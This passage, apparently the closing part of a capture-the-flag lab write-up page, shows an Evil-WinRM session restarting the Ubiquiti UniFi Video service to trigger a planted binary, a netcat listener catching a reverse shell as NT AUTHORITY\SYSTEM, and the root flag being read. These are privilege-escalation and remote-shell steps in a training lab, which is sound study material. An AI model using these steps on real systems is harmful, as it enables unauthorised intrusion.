+<div class="language-shell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\p</span>rogramdata<span class="se">\u</span>nifi-video&gt;<span class="w"> </span>stop-service<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;Ubiquiti Unifi Video&quot;</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Warning:<span class="w"> </span>Waiting<span class="w"> </span><span class="k">for</span><span class="w"> </span>service<span class="w"> </span><span class="s1">&#39;Ubiquiti Unifi Video (UniFiVideoService)&#39;</span><span class="w"> </span>to<span class="w"> </span>stop...
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Warning:<span class="w"> </span>Waiting<span class="w"> </span><span class="k">for</span><span class="w"> </span>service<span class="w"> </span><span class="s1">&#39;Ubiquiti Unifi Video (UniFiVideoService)&#39;</span><span class="w"> </span>to<span class="w"> </span>stop...
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Warning:<span class="w"> </span>Waiting<span class="w"> </span><span class="k">for</span><span class="w"> </span>service<span class="w"> </span><span class="s1">&#39;Ubiquiti Unifi Video (UniFiVideoService)&#39;</span><span class="w"> </span>to<span class="w"> </span>stop...
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\p</span>rogramdata<span class="se">\u</span>nifi-video&gt;<span class="w"> </span>start-service<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;Ubiquiti Unifi Video&quot;</span>
+</span></code></pre></div>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>$<span class="w"> </span>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>...
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.17<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.10.104<span class="o">]</span><span class="w"> </span><span class="m">49819</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Version<span class="w"> </span><span class="m">10</span>.0.14393<span class="o">]</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2016</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>All<span class="w"> </span>rights<span class="w"> </span>reserved.
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;whoami
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>whoami
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>nt<span class="w"> </span>authority<span class="se">\s</span>ystem
+</span></code></pre></div>
+<h2 id="post-exploitation">Post Exploitation</h2>
+<p>Get the flag:</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type<span class="w"> </span>root.txt
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">type</span><span class="w"> </span>root.txt
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>5c5d6c15aad3a052570839b7d8b45473
+</span></code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "..", "features": ["content.code.copy", "content.code.select", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.section", "navigation.top", "navigation.expand", "search.share", "search.suggest", "navigation.indexes"], "search": "../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
